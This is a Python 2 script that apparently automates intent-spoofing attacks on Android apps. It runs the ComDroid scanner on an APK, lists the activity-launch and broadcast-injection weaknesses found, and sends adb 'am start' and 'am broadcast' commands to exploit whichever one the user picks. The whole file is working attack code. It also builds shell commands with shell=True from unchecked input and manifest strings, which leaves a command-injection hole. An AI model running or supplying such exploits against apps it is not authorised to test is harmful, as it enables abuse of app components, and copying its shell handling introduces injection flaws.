import subprocess
import os
import sys
import xml.etree.ElementTree as ET
import shutil


#Class to hold vulnerability details
#Vuln.type will be either "Activity" or "Broadcast"
class Vuln:
	def __init__(self, vs):
		self.vulnString = vs

		#parse Malicious Activity Launch vulns
		t = vs.find("Malicious Activity Launch")
		c = vs.find(",")
		if t != -1:
			self.type = "Activity"
			self.activity = vs[t+27:c]
			self.line = vs[c+2:]
			return

		#parse Malicious Broadcast Injection vulns
		t = vs.find("Malicious Broadcast Injection")
		c = vs.find(",")
		if t != -1:
			self.type = "Broadcast"
			self.activity = vs[t+31:c]
			self.line = vs[c+2:]

	def __str__(self):
		try:
			return("Type: " + self.type + "\nActivity: " + self.activity + "\nLine: " + self.line)
		except:
			return(self.vulnString)


def checkPathForADB():
	try:
		subprocess.call(["adb"], stderr=subprocess.STDOUT, stdout = subprocess.PIPE)
	except OSError:
		print "Make sure your $PATH environment variables includes the path to adb."
		sys.exit(0)	


#Attempt to launch the provided activity
def startActivity(package, activity):
	cmd = 'adb shell am start -n ' + package + '/' + activity
	try:
		pipe = subprocess.Popen([cmd], shell = True, stderr = subprocess.STDOUT, stdout=subprocess.PIPE)
		out, err = pipe.communicate()
		err = out.find("Error")
		if err != -1:
			print out[err:]
			return 1
	except OSError as err:
		print err
		return 1
	return 0


#Attempt to send the specified broadcast intent
def sendBroadcast(broadcast):
	cmd = "adb shell am broadcast -a " + broadcast
	try:
		pipe = subprocess.Popen([cmd], shell = True, stderr = subprocess.STDOUT, stdout=subprocess.PIPE)
		out, err = pipe.communicate()
		err = out.find("Error")
		if err != -1:
			print out[err:]
			return 1
	except OSError as err:
		print err
		return 1
	return 0


#Run Comdroid utility, parse results into Vuln objections
def runComDroidScan():
	apk = raw_input("Enter the path to the apk you want to attack.\n").rstrip()
	output = raw_input("Enter the path to the directory where you want output to be stored.\n").rstrip()
	
	#Create or clear output folder
	if not os.path.isdir(output):
		os.makedirs(output)
	else:
		shutil.rmtree(output + "/dedex")
		shutil.rmtree(output + "/IntentResults")
		shutil.rmtree(output + "/log")
		shutil.rmtree(output + "/unzip")
		os.remove(output + "/AndroidManifest.xml")

	#Run Comdroid utility
	try:
		subprocess.call(["./runComDroid.sh "+apk+" "+output], shell=True,
						 stderr = subprocess.STDOUT, stdout=subprocess.PIPE)
	except OSError as err:
		print err
		sys.exit(0)

	#Parse Comdroid output into Vuln objects
	outputFile = open(output+"/IntentResults/allWarnings", 'r')
	spoofVulns = []
	for line in outputFile:
		if "Malicious" in line:
			spoofVulns.append(Vuln(line))

	if len(spoofVulns) == 0:
		print "No intent spoofing vulnerabilities found. See "+ output+"/IntentResults/allWarnings for full scan output."
		sys.exit(0)
	else:
		print str(len(spoofVulns)) + " intent spoofing vulnerabilities found."
		exploitVulns(spoofVulns, output)
		

#Show user discovered vulns and run exploits
def exploitVulns(spoofVulns, output):
	for i in range(len(spoofVulns)):
		print "Vulnerability " + str(i+1) + ":"
		print spoofVulns[i]

	i = int(raw_input("Enter the number of the vulnerability you'd like to exploit (0 to quit): ")) - 1
	while (i != -1):
		if (spoofVulns[i].type == "Activity"):
			print "Attempting to exploit Activity Launch vulnerability " + str(i) + "..."

			#Parse activity and package names from vuln, attempt to start activity
			a = spoofVulns[i].activity
			package = a[:a.rfind('.')]
			activity = a[a.rfind('.'):]
			if startActivity(package,activity) == 0:
				print "Vulnerability exploited: " + spoofVulns[i].activity + " launched."

		if (spoofVulns[i].type == "Broadcast"):
			print "Attempting to exploit Broadcast Injection vulnerability " + str(i) + "..."

			#Find activity in manifest and parse out intent filters. Attempt to start each intent.
			a = spoofVulns[i].activity
			tree = ET.parse(output+"/AndroidManifest.xml")
			root = tree.getroot()
			intents = []
			for child in root:
				if child.tag == "application":
					for receiver in child.findall("receiver"):
						if receiver.attrib["{http://schemas.android.com/apk/res/android}name"] == a:
							for intent in receiver.findall("intent-filter"):
								for action in intent.findall("action"):
									intents.append(action.attrib["{http://schemas.android.com/apk/res/android}name"])

			print str(len(intents)) + " intent(s) found."
			for i in range(len(intents)):
				print "Trying intent " + str(i+1) + "..."
				if sendBroadcast(intents[i]) == 0:
					print "Success!"

		i = int(raw_input("Enter the number of the vulnerability you'd like to exploit (0 to quit): ")) - 1


checkPathForADB()
runComDroidScan()

